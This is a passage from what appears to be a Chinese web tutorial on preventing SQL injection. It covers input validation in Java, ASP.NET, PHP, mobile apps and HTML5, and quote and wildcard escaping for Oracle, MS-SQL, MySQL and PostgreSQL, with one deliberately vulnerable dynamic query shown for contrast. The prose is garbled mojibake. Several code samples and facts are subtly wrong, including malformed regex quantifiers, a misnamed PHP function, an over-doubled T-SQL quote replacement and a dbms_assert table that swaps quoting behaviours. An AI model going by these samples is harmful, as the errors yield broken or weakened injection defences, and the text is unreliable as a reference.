class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨Javaä¸­å®ç°è¾“å…¥éªŒè¯æ—¶ï¼Œè¿˜æœ‰ä¸€ç§å¾ˆæœ‰ç”¨çš„èµ„æºOWASP ESAPI(Enterprise Security API)ï¼ŒåŒ…æ‹¬org.owasp.esapi.reference.DefaultValidatorè¾“å…¥éªŒè¯ç±»çš„å®ç°ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨å®ƒï¼Œä¹Ÿå¯ä»¥å°†å®ƒä½œä¸ºè‡ªå®šä¹‰è¾“å…¥éªŒè¯å¼•æ“çš„å‚è€ƒå®ç°ã€‚</p><h4 id="NETä¸­çš„è¾“å…¥éªŒè¯"><a href="#NETä¸­çš„è¾“å…¥éªŒè¯" class="headerlink" title=".NETä¸­çš„è¾“å…¥éªŒè¯"></a>.NETä¸­çš„è¾“å…¥éªŒè¯</h4><p>ASP.NETæä¾›äº†<code>Regular-Expression Validator</code>æ§ä»¶å’Œ<code>Custom Validator</code>æ§ä»¶ï¼Œæ‰§è¡Œå®¢æˆ·ç«¯éªŒè¯ã€‚</p><p>ä¸‹åˆ—ä»£ç æ˜¯ä½¿ç”¨<code>RegularExpressionValidator</code>éªŒè¯ç”¨æˆ·åçš„ä¾‹å­ï¼Œç”¨æˆ·åä¸­åªèƒ½åŒ…å«å­—æ¯(å¤§å†™å’Œå°å†™)å¹¶ä¸”æ€»é•¿åº¦å¿…é¡»ä»‹äº8åˆ°12ä¸ªå­—ç¬¦ä¹‹é—´ã€‚</p><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&amp;ltasp:textbox id="userName" runat="server"/&gt;&amp;ltasp:RegularExpressionValidator id="usernameRegEx" runat="server" ControlToValidate="userName"ErrorMessage="Username must contain 8 - 12 letters only."ValidationExpression="^[a-zA-Z]{8,12}$" /&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥çš„ä»£ç ç‰‡æ®µæ˜¯ä½¿ç”¨<code>CustomValidator</code>éªŒè¯å£ä»¤æ˜¯å¦ä¸ºæ­£ç¡®æ ¼å¼çš„ä¾‹å­ã€‚åˆ›å»ºä¸¤ä¸ªç”¨æˆ·å®šä¹‰å‡½æ•°<code>PwdValidate</code>ä½äºæœåŠ¡å™¨ä¸Šï¼Œè´Ÿè´£å¯¹å£ä»¤å€¼è¿›è¡ŒéªŒè¯ï¼›<code>ClientPwdValidate</code>ä½äºå®¢æˆ·ç«¯çš„JavaScriptæˆ–VBScriptä¸­ï¼Œè´Ÿè´£å¯¹ç”¨æˆ·æµè§ˆå™¨ä¸Šçš„å£ä»¤å€¼è¿›è¡ŒéªŒè¯ã€‚</p><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&amp;ltasp:textbox id= "txt Pas sword" runat="server"/&gt;&amp;ltasp:CustomValidator runat="server" ControlToValidate="txtPassword"ClientValidationFunction="ClientPwdValidate"ErrorMessage="Password does not meet requirements."OnServerValidate="PwdValidate" /&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="PHPä¸­çš„è¾“å…¥éªŒè¯"><a href="#PHPä¸­çš„è¾“å…¥éªŒè¯" class="headerlink" title="PHPä¸­çš„è¾“å…¥éªŒè¯"></a>PHPä¸­çš„è¾“å…¥éªŒè¯</h4><p>PHPä¸ç›´æ¥ä¾èµ–äºè¡¨ç¤ºå±‚ï¼Œå› è€ŒPHPä¸­çš„è¾“å…¥éªŒè¯æ”¯æŒå±äºæ‰€ä½¿ç”¨çš„æ¡†æ¶ã€‚è®¸å¤šPHPåº”ç”¨ç¨‹åºç›´æ¥åœ¨ä»£ç ä¸­å®ç°è¾“å…¥éªŒè¯ã€‚</p><p>å¯ä»¥ä½¿ç”¨PHPä¸­çš„å¾ˆå¤šå‡½æ•°ä½œä¸ºæ„é€ è¾“å…¥éªŒè¯çš„åŸºæœ¬æ„é€ å—ï¼ŒåŒ…æ‹¬ï¼š</p><ul><li><p>preg_match(regex,matchstring):ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼regexå¯¹ matchstringæ‰§è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ã€‚</p></li><li><p>is_&lt;typeï¼(input):æ£€æŸ¥è¾“å…¥æ˜¯å¦ï¼œtypeï¼ï¼Œä¾‹å¦‚ is_numeric()ã€‚</p></li><li><p>strlen(input)ï¼šæ£€æŸ¥è¾“å…¥çš„é•¿åº¦ã€‚</p></li></ul><p>ä½¿ç”¨preg_matchéªŒè¯è¡¨å•å‚æ•°ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/^[a-zA-Z] {8, 12}$/D"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//å¤„ç†éªŒè¯å¤±è´¥çš„æƒ…å†µ</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="åœ¨ç§»åŠ¨åº”ç”¨ç¨‹åºä¸­æ£€éªŒè¾“å…¥"><a href="#åœ¨ç§»åŠ¨åº”ç”¨ç¨‹åºä¸­æ£€éªŒè¾“å…¥" class="headerlink" title="åœ¨ç§»åŠ¨åº”ç”¨ç¨‹åºä¸­æ£€éªŒè¾“å…¥"></a>åœ¨ç§»åŠ¨åº”ç”¨ç¨‹åºä¸­æ£€éªŒè¾“å…¥</h4><p>ç§»åŠ¨åº”ç”¨ç¨‹åºä¸­çš„æ•°æ®æ—¢å¯ä»¥å­˜å‚¨åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šï¼Œä¹Ÿå¯ä»¥å­˜å‚¨åœ¨æœ¬åœ°çš„åº”ç”¨ä¸­ã€‚å¯¹äºè¿™ä¸¤ç§æƒ…å†µéƒ½éœ€è¦åœ¨æœ¬åœ°æ£€éªŒè¾“å…¥ã€‚å¯¹äºè¿œç¨‹å­˜å‚¨çš„æ•°æ®ï¼Œéœ€è¦åœ¨è¿œç¨‹æœåŠ¡å™¨ç«¯å¯¹è¾“å…¥è¿›è¡Œæ£€æŸ¥ã€‚</p><p>å¯ä»¥é‡‡ç”¨ä¸¤ç§æ–¹å¼å¯¹è¾“å…¥æœç´¢(in-device input)çš„è¾“å…¥æ•°æ®è¿›è¡Œæ£€éªŒã€‚å¯ä»¥ä½¿ç”¨ä¸€ç§ä»…æ”¯æŒæˆ‘ä»¬æ‰€æœŸæœ›æ•°æ®ç±»å‹çš„è¾“å…¥åŸŸç±»å‹(field type)ï¼Œæ¯”å¦‚ä½¿ç”¨ä»…æ”¯æŒè¾“å…¥æ•°å­—çš„è¾“å…¥åŸŸã€‚å¦å¤–ä¹Ÿå¯ä»¥è®¢é˜…è¾“å…¥åŸŸçš„changeäº‹ä»¶ï¼Œå½“æ¥æ”¶åˆ°æ— æ•ˆè¾“å…¥æ—¶ç”±äº‹ä»¶å¤„ç†ç¨‹åºè¿›è¡Œå¤„ç†ã€‚Androidæ”¯æŒè¾“å…¥è¿‡æ»¤å™¨(input filter)çš„æ¦‚å¿µï¼Œå®ƒå¯ä»¥å°†ä¸€ä¸ªæˆ–å¤šä¸ªInputFilterçš„å®ç°è‡ªåŠ¨åœ°åº”ç”¨äºæ•°æ®ï¼Œå¹¶ä¸”å¯ä»¥æ‹’ç»æ— æ•ˆçš„è¾“å…¥ã€‚</p><h4 id="åœ¨HTML5ä¸­æ£€éªŒè¾“å…¥"><a href="#åœ¨HTML5ä¸­æ£€éªŒè¾“å…¥" class="headerlink" title="åœ¨HTML5ä¸­æ£€éªŒè¾“å…¥"></a>åœ¨HTML5ä¸­æ£€éªŒè¾“å…¥</h4><p>åœ¨å¼€å‘HTML5åº”ç”¨ç¨‹åºæ—¶ï¼Œæ•°æ®å¯ä»¥å­˜å‚¨åœ¨Webæµè§ˆå™¨çš„æœ¬åœ°å­˜å‚¨ä¸­ï¼Œä¹Ÿå¯ä»¥å­˜å‚¨åœ¨æ‰¿è½½HTML5Webåº”ç”¨ç¨‹åºçš„è¿œç¨‹WebæœåŠ¡å™¨ä¸Šã€‚å¯¹äºå­˜å‚¨åœ¨æµè§ˆå™¨æœ¬åœ°å­˜å‚¨ä¸­çš„æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨JavaScriptæ£€éªŒæ•°æ®ï¼Œæˆ–è€…ä½¿ç”¨HTML5æä¾›çš„æ–°ç±»å‹çš„ï¼œinputï¼è¾“å…¥åŸŸè¿›è¡Œæ£€éªŒã€‚è¿™äº›ï¼œinputï¼è¾“å…¥åŸŸæ”¯æŒrequiredå±æ€§ï¼Œè¯¥å±æ€§æŒ‡ç¤ºæµè§ˆå™¨æ£€æŸ¥åœ¨è¯¥è¾“å…¥åŸŸä¸­å¿…é¡»å…·æœ‰è¾“å…¥å€¼ã€‚æ­¤å¤–ï¼Œè¿˜æ”¯æŒpatternå±æ€§ï¼Œå…è®¸å¼€å‘äººå‘˜è®¾ç½®ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œè¾“å…¥çš„æ•°æ®å¿…é¡»æ»¡è¶³è¯¥æ­£åˆ™è¡¨è¾¾å¼çš„çº¦æŸï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;input type="text" required= "required" pattern:"^[0-9] {4}...<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœå®¢æˆ·ç«¯åº”ç”¨ç¨‹åºæ­£æŠŠæ•°æ®å‘é€å›æœåŠ¡å™¨ç«¯çš„åº”ç”¨ç¨‹åºï¼Œ é‚£ä¹ˆæœåŠ¡å™¨ç«¯ä»£ç å¿…é¡»æ€»æ˜¯é‡æ–°æ£€éªŒå®ƒä»HTML5åº”ç”¨ç¨‹åºä¸­æ¥æ”¶åˆ°çš„è¾“å…¥æ•°æ®ã€‚</p><h3 id="ç¼–ç è¾“å‡º"><a href="#ç¼–ç è¾“å‡º" class="headerlink" title="ç¼–ç è¾“å‡º"></a>ç¼–ç è¾“å‡º</h3><h4 id="ç¼–ç å‘é€ç»™æ•°æ®åº“çš„å†…å®¹"><a href="#ç¼–ç å‘é€ç»™æ•°æ®åº“çš„å†…å®¹" class="headerlink" title="ç¼–ç å‘é€ç»™æ•°æ®åº“çš„å†…å®¹"></a>ç¼–ç å‘é€ç»™æ•°æ®åº“çš„å†…å®¹</h4><p>æœ‰æ—¶ç™½åå•è¿‡æ»¤å¹¶ä¸èƒ½å®Œå…¨ï¼Œå¯èƒ½è¿˜ä¼šåŠ¨æ€æ‹¼æ¥äº§ç”ŸSQLæ³¨å…¥ï¼Œå¯¹äºæ— æ³•æˆ–ä¸é€‚åˆä½¿ç”¨å‚æ•°åŒ–è¯­å¥çš„æƒ…å†µï¼Œæœ‰å¿…è¦å¯¹å‘é€ç»™æ•°æ®åº“çš„æ•°æ®è¿›è¡Œç¼–ç ï¼ˆæˆ–å¼•ç”¨ï¼‰</p><h5 id="é’ˆå¯¹Oracleçš„ç¼–ç "><a href="#é’ˆå¯¹Oracleçš„ç¼–ç " class="headerlink" title="é’ˆå¯¹Oracleçš„ç¼–ç "></a>é’ˆå¯¹Oracleçš„ç¼–ç </h5><p>Oracleä½¿ç”¨å•å¼•å·ä½œä¸ºå­—ç¬¦ä¸²çš„ç»“æŸç¬¦ï¼Œå› è€Œæœ‰å¿…è¦å¯¹åŒ…å«åœ¨å­—ç¬¦ä¸²ï¼ˆåŠ¨æ€SQLä¸­å°†åŒ…å«è¯¥å­—ç¬¦ä¸²ï¼‰ä¸­çš„å•å¼•å·è¿›è¡Œç¼–ç ã€‚</p><p>åœ¨Oracleä¸­ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨ä¸¤ä¸ªå•å¼•å·æ›¿æ¢å•ä¸ªå•å¼•å·çš„æ–¹æ³•æ¥å®ç°ç¼–ç ç›®çš„ã€‚</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"''"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç”±äºåœ¨PL/SQLä¸­éœ€è¦ä¸ºå•å¼•å·æ·»åŠ å¼•ç”¨ç¬¦ï¼ˆå› ä¸ºå®ƒæ˜¯å­—ç¬¦ä¸²ç»“æŸç¬¦ï¼‰ï¼Œå› è€Œåœ¨PL/SQLä¸­éœ€è¦ä½¿ç”¨ä¸¤ä¸ªå•å¼•å·æ¥æ›¿æ¢å•ä¸ªå•å¼•å·ã€‚</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">sql <span class="token operator">=</span> <span class="token function">replace</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span> '''<span class="token char">','</span>'''''''<span class="token punctuation">)</span>ï¼›sql <span class="token operator">=</span> <span class="token function">replace</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span> <span class="token function">CHR</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">CHR</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">CHR</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¯¹LIKEå­—å¥çš„é€šé…ç¬¦è½¬ä¹‰</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">WHERE</span> name <span class="token operator">LIKE</span> <span class="token string">'a%'</span><span class="token comment">-- æ˜“å—æ”»å‡»ã€‚è¿”å›æ‰€æœ‰ä»¥"a'å­—ç¬¦å¼€å¤´çš„ç”¨æˆ·</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">WHERE</span> name <span class="token operator">LIKE</span> <span class="token string">'a\%'</span> <span class="token keyword">ESCAPE</span> <span class="token string">'\'-- ä¸å®¹æ˜“å—æ”»å‡»ï¼Œè¿”å›ç”¨æˆ·'</span>a<span class="token operator">%</span><span class="token string">',å¦‚æœå­˜åœ¨ä¸€ä¸ªè¿™æ ·çš„ç”¨æˆ·çš„è¯'</span><span class="token comment">-- ä½¿ç”¨ESCAPEå­å¥æ—¶ï¼Œå¯ä»¥æŒ‡å®šä»»ä½•å•ä¸ªå­—ç¬¦ä½œä¸ºè½¬ä¹‰å­—ç¬¦</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>â€œqâ€å¼•ç”¨ï¼Œé‡‡ç”¨ qâ€™[QUOTE CHAR]string[QUOTE CHAR]â€™æ ¼å¼ã€‚å¼•ç”¨å­—ç¬¦(quote character)å¯ä»¥æ˜¯ä»»ä½•æœªå‡ºç°åœ¨å­—ç¬¦ä¸²ä¸­çš„å•ä¸ªå­—ç¬¦</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">q<span class="token string">'(5%)'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœæ— æ³•ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢ï¼Œå°±åº”è¯¥ä½¿ç”¨dbms_assertåŒ…æ¥æ‰§è¡Œè¾“å…¥éªŒè¯ã€‚dbms_assertæä¾›äº†7ä¸ªä¸åŒçš„å‡½æ•°(ENQUOTE_LITERALã€ENQUOTE_ NAMEã€NOOPã€QUALIFIED_SQL_NAMEã€ SCHEMA_NAMEã€SIMPLE_SQL_NAMEå’ŒSQL_OBJECT_NAME)æ¥éªŒè¯ä¸åŒç±»å‹çš„è¾“å…¥ã€‚</p><p>ä¸€ä¸ªæœªä½¿ç”¨dbms_assertçš„éå®‰å…¨æŸ¥è¯¢(FIELDã€OWNERå’ŒTABLEä¸­å­˜åœ¨SQLæ³¨å…¥)ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">execute</span> immediate <span class="token string">'select'</span><span class="token operator">||</span> FIELD <span class="token operator">||</span><span class="token string">'from'</span><span class="token operator">||</span> OWNER <span class="token operator">||</span><span class="token string">'.'</span><span class="token operator">||</span> <span class="token keyword">TABLE</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸‹é¢æ˜¯ç›¸åŒçš„æŸ¥è¯¢ï¼Œä¸è¿‡ä½¿ç”¨äº†dbms_assertè¿›è¡Œè¾“å…¥éªŒè¯ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">execute</span> immediate <span class="token string">'select '</span> <span class="token operator">||</span>sys<span class="token punctuation">.</span>dbms_assert<span class="token punctuation">.</span>SIMPLE_SQL_NAME<span class="token punctuation">(</span>FIELD<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">'from'</span> <span class="token operator">||</span>sys<span class="token punctuation">.</span>dbms_assert<span class="token punctuation">.</span>ENQUOTE_NAME<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>dbms_assert<span class="token punctuation">.</span>SCHEMA_NAME<span class="token punctuation">(</span>OWNER<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">FALSE</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'.'</span><span class="token operator">||</span>sys<span class="token punctuation">.</span>dbms_assert<span class="token punctuation">.</span>QUALIFIED_SQL_NAME<span class="token punctuation">(</span><span class="token keyword">TABLE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>dbms assert å‡½æ•°</p><table><thead><tr><th align="left">å‡½   æ•°</th><th>æ   è¿°</th></tr></thead><tbody><tr><td align="left">DBMS_ASSERT.SCHEMA_NAME</td><td>è¯¥å‡½æ•°æ£€æŸ¥ä¼ é€’çš„å­—ç¬¦ä¸²æ˜¯å¦ä¸ºæ•°æ®åº“ä¸­å­˜åœ¨çš„å¯¹è±¡</td></tr><tr><td align="left">DBMS_ASSERT.SIMPLE_SQL_NAME</td><td>è¯¥å‡½æ•°æ£€æŸ¥SQLå…ƒç´ ä¸­æ˜¯å¦åªåŒ…å«A-Zã€a-zã€0-9ã€$ã€ #å’Œ_è¿™æ ·çš„å­—ç¬¦ã€‚å¦‚æœä½¿ç”¨åŒå¼•å·æ¥å¼•ç”¨å‚æ•°ï¼Œé‚£ä¹ˆå…è®¸ä½¿ç”¨é™¤åŒå¼•å·ä¹‹å¤–çš„æ‰€æœ‰å­—ç¬¦</td></tr><tr><td align="left">DBMS_ASSERT.SQL_OBJECT_NAME</td><td>è¯¥å‡½æ•°æ£€æŸ¥ä¼ é€’çš„å­—ç¬¦ä¸²æ˜¯å¦ä¸ºæ•°æ®åº“ä¸­å­˜åœ¨çš„å¯¹è±¡</td></tr><tr><td align="left">DBMS_ASSERT.QUALIFIED_SQL_NAME</td><td>è¯¥å‡½æ•°ä¸SIMPLE_SQL_NAMEéå¸¸ç±»ä¼¼ï¼Œä¸è¿‡å®ƒè¿˜å…è®¸æ•°æ®åº“è¿æ¥</td></tr><tr><td align="left">DBMS_ASSERT.ENQUOTE_LITERAL</td><td>è¯¥å‡½æ•°ä½¿ç”¨åŒå¼•å·æ¥å¼•ç”¨ä¼ é€’çš„å‚æ•°ã€‚å¦‚æœå‚æ•°å·²è¢«å¼•ç”¨ï¼Œå°±ä¸åšä»»ä½•äº‹æƒ…</td></tr><tr><td align="left">DBMS_ASSERT.ENQUOTE_NAME</td><td>å¦‚æœæœªä½¿ç”¨å•å¼•å·å¼•ç”¨ç”¨æˆ·æä¾›çš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆè¯¥å‡½æ•°ä¼šä½¿ç”¨å•å¼•å·æ¥å¼•ç”¨å®ƒ</td></tr></tbody></table><h5 id="é’ˆå¯¹MS-SQLçš„ç¼–ç "><a href="#é’ˆå¯¹MS-SQLçš„ç¼–ç " class="headerlink" title="é’ˆå¯¹MS-SQLçš„ç¼–ç "></a>é’ˆå¯¹MS-SQLçš„ç¼–ç </h5><p>MS-SQLä½¿ç”¨å•å¼•å·ä½œä¸ºå­—ç¬¦ä¸²çš„ç»“æŸç¬¦ï¼Œå› è€Œæœ‰å¿…è¦å¯¹åŒ…å«åœ¨å­—ç¬¦ä¸²ï¼ˆåŠ¨æ€SQLä¸­å°†åŒ…å«è¯¥å­—ç¬¦ä¸²ï¼‰ä¸­çš„å•å¼•å·è¿›è¡Œç¼–ç ã€‚</p><p>åœ¨MS-SQLä¸­ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨ä¸¤ä¸ªå•å¼•å·æ›¿æ¢å•ä¸ªå•å¼•å·çš„æ–¹æ³•æ¥å®ç°ç¼–ç ç›®çš„ã€‚</p><pre class="line-numbers language-C#" data-language="C#"><code class="language-C#">sql = sql.replace("'","''")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç”±äºåœ¨Transact-SQLä¸­éœ€è¦ä¸ºå•å¼•å·æ·»åŠ å¼•ç”¨ç¬¦(å› ä¸ºå®ƒæ˜¯å­—ç¬¦ä¸²ç»“æŸç¬¦)ï¼Œå› è€Œåœ¨Transact-SQLä¸­éœ€è¦ä½¿ç”¨ä¸¤ä¸ªå•å¼•å·æ¥æ›¿æ¢å•ä¸ªå•å¼•å·ã€‚</p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">SET @enc = replace(@input,'''','''''''')//ä½¿ç”¨å­—ç¬¦ç¼–ç è¡¨ç¤ºä¸Šè¿°å†…å®¹é€»è¾‘æ€§ä¼šæ›´å¼ºï¼Œä¹Ÿæ›´åŠ æ¸…æ¥šï¼šSET @enc = replace(@input, CHAR(39), CHAR(39) + CHAR(39));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¯¹LIKEå­—å¥çš„é€šé…ç¬¦è½¬ä¹‰</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token keyword">sql</span><span class="token punctuation">.</span><span class="token keyword">Replace</span><span class="token punctuation">(</span><span class="token string">"["</span><span class="token punctuation">,</span><span class="token string">"[[]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token keyword">sql</span><span class="token punctuation">.</span><span class="token keyword">Replace</span><span class="token punctuation">(</span><span class="token string">"%"</span><span class="token punctuation">,</span><span class="token string">"[%]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token keyword">sql</span><span class="token punctuation">.</span><span class="token keyword">Replace</span><span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">,</span><span class="token string">"[_]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">WHERE</span> name <span class="token operator">LIKE</span> <span class="token string">'a%'</span><span class="token comment">-- æ˜“å—æ”»å‡»ã€‚è¿”å›æ‰€æœ‰ä»¥"a'å­—ç¬¦å¼€å¤´çš„ç”¨æˆ·</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">WHERE</span> name <span class="token operator">LIKE</span> <span class="token string">'a\%'</span> <span class="token keyword">ESCAPE</span> <span class="token string">'\'-- ä¸å®¹æ˜“å—æ”»å‡»ï¼Œè¿”å›ç”¨æˆ·'</span>a<span class="token operator">%</span><span class="token string">',å¦‚æœå­˜åœ¨ä¸€ä¸ªè¿™æ ·çš„ç”¨æˆ·çš„è¯'</span><span class="token comment">-- ä½¿ç”¨ESCAPEå­å¥æ—¶ï¼Œå¯ä»¥æŒ‡å®šä»»ä½•å•ä¸ªå­—ç¬¦ä½œä¸ºè½¬ä¹‰å­—ç¬¦</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="é’ˆå¯¹MySQLçš„ç¼–ç "><a href="#é’ˆå¯¹MySQLçš„ç¼–ç " class="headerlink" title="é’ˆå¯¹MySQLçš„ç¼–ç "></a>é’ˆå¯¹MySQLçš„ç¼–ç </h5><p>ç”±äºMySQLä½¿ç”¨å•å¼•å·ä½œä¸ºå­—ç¬¦ä¸²å­—é¢é‡çš„ç»“æŸç¬¦ï¼Œå› è€Œæœ‰å¿…è¦å¯¹åŒ…å«åœ¨å­—ç¬¦ä¸²(åŠ¨æ€SQLä¸­å°†åŒ…å«è¯¥å­—ç¬¦ä¸²)ä¸­çš„å•å¼•å·è¿›è¡Œç¼–ç ã€‚</p><p>åœ¨MySQLä¸­ï¼Œä½¿ç”¨ä¸¤ä¸ªå•å¼•å·æ›¿æ¢å•ä¸ªå•å¼•å·æ¥å®ç°ç¼–ç ç›®çš„ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨åæ–œçº¿()æ¥å¼•ç”¨å•å¼•å·ã€‚</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"\'"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>PHPè¿˜æä¾›äº†mysql_real_escape()å‡½æ•°ã€‚è¯¥å‡½æ•°ä¼šè‡ªåŠ¨ä½¿ç”¨åæ–œçº¿æ¥å¼•ç”¨å•å¼•å·åŠå…¶ä»–å…·æœ‰æ½œåœ¨å±å®³çš„å­—ç¬¦ï¼Œä¾‹å¦‚0x00(NULL)ã€æ¢è¡Œç¬¦(\n)ã€å›è½¦ç¬¦(\r)ã€åŒå¼•å·(â€œ)ã€åæ–œçº¿() å’Œ Ox1A(Ctrl+Z)</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç”±äºéœ€è¦ä¸ºå•å¼•å·æ·»åŠ å¼•ç”¨ç¬¦(å› ä¸ºå®ƒæ˜¯å­—ç¬¦ä¸²ç»“æŸç¬¦)ï¼Œå› è€Œåœ¨å­˜å‚¨è¿‡ç¨‹ä»£ç ä¸­éœ€è¦ä½¿ç”¨ä¸¤ä¸ªå•å¼•å·æ¥æ›¿æ¢å•ä¸ªå•å¼•å·ã€‚</p><pre class="line-numbers language-C#" data-language="C#"><code class="language-C#">SET @sql = REPLACE(@sql,'\'','\\\'')//ä½¿ç”¨å­—ç¬¦ç¼–ç è¡¨ç¤ºä¸Šè¿°å†…å®¹é€»è¾‘æ€§ä¼šæ›´å¼ºï¼Œä¹Ÿæ›´åŠ æ¸…æ¥šï¼šSET @enc = REPLACE(@input, CHAR(39) , CHAR(92, 39));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¯¹LIKEå­—å¥çš„é€šé…ç¬¦è½¬ä¹‰</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token keyword">sql</span><span class="token punctuation">.</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">"%"</span><span class="token punctuation">,</span><span class="token string">"\%"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token keyword">sql</span><span class="token punctuation">.</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">,</span><span class="token string">"\_"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="é’ˆå¯¹PostgreSQLçš„ç¼–ç "><a href="#é’ˆå¯¹PostgreSQLçš„ç¼–ç " class="headerlink" title="é’ˆå¯¹PostgreSQLçš„ç¼–ç "></a>é’ˆå¯¹PostgreSQLçš„ç¼–ç </h5><p>PostgreSQLä¹Ÿä½¿ç”¨å•å¼•å·ä½œä¸ºå­—ç¬¦ä¸²å­—é¢é‡çš„ç»“æŸç¬¦ï¼Œå¯ä»¥é‡‡ç”¨ä¸¤ç§åŠæ³•å¯¹å•å¼•å·è¿›è¡Œç¼–ç ã€‚</p><p>ç¬¬ä¸€ç§æ–¹æ³•ä½¿ç”¨ä¸¤ä¸ªå•å¼•å·æ›¿æ¢ä¸€ä¸ªå•å¼•å·ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$encodedValue</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"''"</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" 